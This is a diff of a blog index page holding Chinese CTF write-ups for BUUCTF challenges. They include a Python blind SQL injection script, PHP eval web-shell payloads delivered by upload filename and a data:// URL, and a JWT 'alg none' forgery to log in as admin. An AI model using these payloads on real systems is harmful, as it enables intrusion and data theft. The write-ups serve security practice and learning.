+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$result=mysqli_query($con,&quot;select * from images where id=&#x27;&#123;$id&#125;&#x27; or path=&#x27;&#123;$path&#125;&#x27;&quot;);</span><br><span class="line">所以我们要让id变成不识别的，然后将</span><br><span class="line"></span><br><span class="line">select * from images where id=&#x27;\&#x27; or path=&#x27;&#123;$path&#125;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>构造成下面那样差不多吧</p>
+<p>这样的话下面的语句就被分为</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from images where id=&#x27;      \&#x27; or path=&#x27;            &#123;$path&#125;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>也就是说 \ 后面的 ‘ 被转义了，所以闭合情况变了，这样就可以通过传上去的path去搞事情了</p>
+<p>因为没有回显，所以，这里我使用了盲注，脚本如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import  requests</span><br><span class="line">url = &quot;http://9f0a8671-b351-45a7-97ff-d023946ec8da.node5.buuoj.cn:81/image.php?id=\\0&amp;path=&quot;</span><br><span class="line">payload = &quot; or ascii(substr((select username from users),&#123;&#125;,1))&gt;&#123;&#125;%23&quot;</span><br><span class="line">result = &#x27;&#x27;</span><br><span class="line">for i in range(1,100):</span><br><span class="line">    high = 127</span><br><span class="line">    low = 32</span><br><span class="line">    mid = (low+high) // 2</span><br><span class="line">    # print(mid)</span><br><span class="line">    while(high&gt;low):</span><br><span class="line">        r = requests.get(url + payload.format(i,mid))</span><br><span class="line">       # print(url + payload.format(i,mid))</span><br><span class="line">        if &#x27;JFIF&#x27; in r.text:</span><br><span class="line">            low = mid + 1</span><br><span class="line">        else:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low + high) // 2</span><br><span class="line">    result += chr(mid)</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>
+
+<p>我这里就没有放爆表的情况了</p>
+<p>username和password都要爆</p>
+<p>登录就行</p>
+<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240606201838905.png" alt="image-20240606201838905"></p>
+<p>好好好</p>
+<p>文件上传</p>
+<p>尝试了各种码都没啥用</p>
+<p>最后更改文件名</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?=@eval($_POST[&#x27;a&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>就行了，反而，七七乖乖的</p>
+<p>应该是直接读取的文件名，反而没有读文件内容，好心理战</p>
+<p>之后就是蚁剑连接拿到flag</p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        
+        
+    </div>
+    <a href="/2024/06/05/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/CISCN2019-%E6%80%BB%E5%86%B3%E8%B5%9B-Day2-Web1-Easyweb/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2024/06/05/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/HFCTF2020-EasyLogin/">
+        <h2 class="post-title">[HFCTF2020]EasyLogin</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/6/5
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <p>神奇的题，使我的大脑旋转</p>
+<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240605203717806.png" alt="image-20240605203717806"></p>
+<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240605203723254.png" alt="image-20240605203723254"></p>
+<p>这俩界面试过了啊</p>
+<p>sql注入和ssti没啥用，不信可以试试，然后告诉我怎么写（请务必这样做）</p>
+<p>所以开始看看源码</p>
+<p>发现了css和js</p>
+<p>一个个点进去看了，发现在app.js里有个东西</p>
+<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240605203934241.png" alt="image-20240605203934241"></p>
+<p>然后？然后就卡住了</p>
+<p>我知道需要进入&#x2F;api&#x2F;flag但是我进不去啊</p>
+<p>所以去查找一下</p>
+<p>发现是koa框架</p>
+<h4 id="koa框架"><a href="#koa框架" class="headerlink" title="koa框架"></a>koa框架</h4><p>koa是一个基于node实现的一个新的web框架，它是由express框架的原班人马打造的。它的特点是优雅、简洁、表达力强、自由度高。它更express相比，它是一个更轻量的node框架，因为它所有功能都通过插件实现，这种插拔式的架构设计模式，很符合unix哲学。</p>
+<p>emm</p>
+<p>暂时别过多了解，脑子烂，会炸</p>
+<p>可以先了解一下它的源码结构&#x2F;文件框架</p>
+<p><img src="https://img-blog.csdnimg.cn/9bdbaa65afb64c2aadf25758ee781e4d.png" alt="img"></p>
+<p>所以，我们使用常见框架去获取一下控制器文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/controllers/api.js</span><br></pre></td></tr></table></figure>
+
+<p>发现源代码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">const crypto = require(&#x27;crypto&#x27;);</span><br><span class="line">const fs = require(&#x27;fs&#x27;)</span><br><span class="line">const jwt = require(&#x27;jsonwebtoken&#x27;)</span><br><span class="line"></span><br><span class="line">const APIError = require(&#x27;../rest&#x27;).APIError;</span><br><span class="line"></span><br><span class="line">module.exports = &#123;</span><br><span class="line">    &#x27;POST /api/register&#x27;: async (ctx, next) =&gt; &#123;</span><br><span class="line">        const &#123;username, password&#125; = ctx.request.body;</span><br><span class="line"></span><br><span class="line">        if(!username || username === &#x27;admin&#x27;)&#123;</span><br><span class="line">            throw new APIError(&#x27;register error&#x27;, &#x27;wrong username&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(global.secrets.length &gt; 100000) &#123;</span><br><span class="line">            global.secrets = [];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        const secret = crypto.randomBytes(18).toString(&#x27;hex&#x27;);</span><br><span class="line">        const secretid = global.secrets.length;</span><br><span class="line">        global.secrets.push(secret)</span><br><span class="line"></span><br><span class="line">        const token = jwt.sign(&#123;secretid, username, password&#125;, secret, &#123;algorithm: &#x27;HS256&#x27;&#125;);</span><br><span class="line"></span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            token: token</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        await next();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    &#x27;POST /api/login&#x27;: async (ctx, next) =&gt; &#123;</span><br><span class="line">        const &#123;username, password&#125; = ctx.request.body;</span><br><span class="line"></span><br><span class="line">        if(!username || !password) &#123;</span><br><span class="line">            throw new APIError(&#x27;login error&#x27;, &#x27;username or password is necessary&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;</span><br><span class="line"></span><br><span class="line">        const sid = JSON.parse(Buffer.from(token.split(&#x27;.&#x27;)[1], &#x27;base64&#x27;).toString()).secretid;</span><br><span class="line"></span><br><span class="line">        console.log(sid)</span><br><span class="line"></span><br><span class="line">        if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) &#123;</span><br><span class="line">            throw new APIError(&#x27;login error&#x27;, &#x27;no such secret id&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        const secret = global.secrets[sid];</span><br><span class="line"></span><br><span class="line">        const user = jwt.verify(token, secret, &#123;algorithm: &#x27;HS256&#x27;&#125;);</span><br><span class="line"></span><br><span class="line">        const status = username === user.username &amp;&amp; password === user.password;</span><br><span class="line"></span><br><span class="line">        if(status) &#123;</span><br><span class="line">            ctx.session.username = username;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            status</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        await next();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    &#x27;GET /api/flag&#x27;: async (ctx, next) =&gt; &#123;</span><br><span class="line">        if(ctx.session.username !== &#x27;admin&#x27;)&#123;</span><br><span class="line">            throw new APIError(&#x27;permission error&#x27;, &#x27;permission denied&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        const flag = fs.readFileSync(&#x27;/flag&#x27;).toString();</span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            flag</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        await next();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    &#x27;GET /api/logout&#x27;: async (ctx, next) =&gt; &#123;</span><br><span class="line">        ctx.session.username = null;</span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            status: true</span><br><span class="line">        &#125;)</span><br><span class="line">        await next();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240605204918499.png" alt="image-20240605204918499"></p>
+<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240605204942488.png" alt="image-20240605204942488"></p>
+<p>两个重点列出来</p>
+<p>一个是有关username和password生成jwt</p>
+<p>一个是读取flag的</p>
+<p>我们发现username要等于admin</p>
+<p>登录验证则是jwt</p>
+<p>所以我们应该对于jwt进行破解</p>
+<p>并且是通过hs256加密，我们需要改为加密方式改为none来进行破解</p>
+<p>标题中的alg字段更改为none，有些JWT库支持无算法，即没有签名算法。当alg为none时，后端将不执行签名验证。 此外对于本题中验证采用的密匙<code>secret</code>值也需要为空或者<code>undefined</code>否则还是会触发验证，所以将JWT中<code>secretid</code>项修改为<code>[]</code>。</p>
+<p>所以，我们需要改变的是</p>
+<p>alog、username、secrettid</p>
+<p>我们先进行抓包</p>
+<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240605212647168.png" alt="image-20240605212647168"></p>
+<p>那大概率就是说authorzation那个就是我们的jwt的值（因为也是验证身份的，应该是一起上传的）</p>
+<p>去解密一下</p>
+<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240605212704207.png" alt="image-20240605212704207"></p>
+<p>拿到了一些重要的信息比如iat</p>
+<p>然后写脚本生成新的jwt</p>
+<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240605212804698.png" alt="image-20240605212804698"></p>
+<p>生成了一串东西</p>
+<p>也就是你的新authorization</p>
+<p>之后在登录的时候抓个包修改一下</p>
+<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240605212949579.png" alt="image-20240605212949579"></p>
+<p>我们就可以以admin的用户进入</p>
+<p>之后再查询api&#x2F;flag路径即可</p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        
+        
+    </div>
+    <a href="/2024/06/05/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/HFCTF2020-EasyLogin/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2024/06/04/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/b01lers2020-Welcome-to-Earth/">
+        <h2 class="post-title">[b01lers2020]Welcome to Earth</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/6/4
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <p>这道题才应该叫套娃</p>
+<p>前几个页面都是查看源代码会给你下一个页面的相对路径，例如</p>
+<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240604215312316.png" alt="image-20240604215312316"></p>
+<p>就不说了</p>
+<p>最后一个界面</p>
+<p>也就是fight</p>
+<p>离谱，是真的离谱</p>
+<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240604215347316.png" alt="image-20240604215347316"></p>
+<p>前一个函数是flag中的元素位置不断不断转换</p>
+<p>然后最后停止</p>
+<p>也就是说，我们最后就是说会找到一个正确的字符串</p>
+<p>很离谱</p>
+<p>我们努力让他看起来正常一点</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pctf&#123;hey_boys_im_baaaaaaaaaack!&#125;</span><br></pre></td></tr></table></figure>
+
+<p>牛逼！man！</p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        
+        
+    </div>
+    <a href="/2024/06/04/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/b01lers2020-Welcome-to-Earth/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2024/06/04/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/HITCON-2017-SSRFme/">
+        <h2 class="post-title">[HITCON 2017]SSRFme</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/6/4
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <p>一进题目就是源码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    if (isset($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;])) &#123;</span><br><span class="line">        $http_x_headers = explode(&#x27;,&#x27;, $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;]);</span><br><span class="line">        $_SERVER[&#x27;REMOTE_ADDR&#x27;] = $http_x_headers[0];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    echo $_SERVER[&quot;REMOTE_ADDR&quot;];</span><br><span class="line"></span><br><span class="line">    $sandbox = &quot;sandbox/&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line"></span><br><span class="line">    $data = shell_exec(&quot;GET &quot; . escapeshellarg($_GET[&quot;url&quot;]));</span><br><span class="line">    $info = pathinfo($_GET[&quot;filename&quot;]);</span><br><span class="line">    $dir  = str_replace(&quot;.&quot;, &quot;&quot;, basename($info[&quot;dirname&quot;]));</span><br><span class="line">    @mkdir($dir);</span><br><span class="line">    @chdir($dir);</span><br><span class="line">    @file_put_contents(basename($info[&quot;basename&quot;]), $data);</span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>
+
+<p>一眼丁真</p>
+<p>因为之前有见过sandbox和mkdir的组合技，所以看出来了，就是说我们会创建一个文件叫做sandbox&#x2F;xxx</p>
+<p>但是，这道题有几个没见过的函数</p>
+<h4 id="chdir"><a href="#chdir" class="headerlink" title="chdir"></a>chdir</h4><p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240604171616901.png" alt="image-20240604171616901"></p>
+<p>也就是说改变当前目录改为sandbox&#x2F;xxx</p>
+<p>再完后看，看到了神奇的东西</p>
+<p>shell_exec这可是好东西，也就是说可以光明正大的命令执行了</p>
+<p>之后还有</p>
+<h4 id="pathinfo"><a href="#pathinfo" class="headerlink" title="pathinfo"></a>pathinfo</h4><p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240604171854910.png" alt="image-20240604171854910"></p>
+<p>也就是说可以字典化</p>
+<p>借一篇wp的演示</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var_dump(pathinfo(&#x27;sandox/cfbb870b58817bf7705c0bd826e8dba7/123&#x27;));</span><br><span class="line">=&gt;</span><br><span class="line">array(3) &#123;</span><br><span class="line">  [&quot;dirname&quot;]=&gt;</span><br><span class="line">  string(39) &quot;sandox/cfbb870b58817bf7705c0bd826e8dba7&quot;</span><br><span class="line">  [&quot;basename&quot;]=&gt;</span><br><span class="line">  string(3) &quot;123&quot;</span><br><span class="line">  [&quot;filename&quot;]=&gt;</span><br><span class="line">  string(3) &quot;123&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>最后就是和之前那个mkdir经常一起出现的，毕竟新创立一个文件夹肯定要写点东西进去才能做一些奇奇怪怪的事情</p>
+<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240604172338640.png"></p>
+<p>所以我们要传入</p>
+<p>url：执行命令</p>
+<p>filename：创建的文件名</p>
+<p>所以我们可以很快反应出来，可以任意命令执行</p>
+<p>爽了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=data://text/plain,&lt;?php @eval($_POST[&#x27;2&#x27;]);?&gt;&amp;filename=flag.php</span><br></pre></td></tr></table></figure>
+
+<p>传输上去之后就说明你已经写入了，接下来就是读文件时刻</p>
+<p>怎么读文件呢？</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$sandbox = &quot;sandbox/&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br></pre></td></tr></table></figure>
+
+<p>也就是说有一个沙盒叫做</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sandbox/xxx</span><br><span class="line">//xxx=md5(&quot;orange&quot;.&quot;ip&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>构建一个小脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$sandox=&quot;sandbox/&quot; . md5(&quot;orange&quot;.&quot;223.147.3.51&quot;);</span><br><span class="line">echo $sandox;</span><br><span class="line">//sandbox/70fe05dce7bd92f0eb22d188342095c2（我的）</span><br></pre></td></tr></table></figure>
+
+<p>所以，我们就直接蚁剑连接</p>
+<p>找到flag和readflag</p>
+<p>分别读取一下，发现readflag是可以的</p>
+<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240604212937666.png" alt="image-20240604212937666"></p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        
+        
+    </div>
+    <a href="/2024/06/04/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/HITCON-2017-SSRFme/" class="go-post">阅读全文</a>
 </div>
 
 
@@ -741,6 +1175,9 @@
     
     <a class="page-num" href="/page/5">5</a>
     
+    
+    <span class="page-omit">...</span>
+    <a class="page-num" href="/page/10">10</a>
     
     
     <a class="page-num" href="/page/4/">
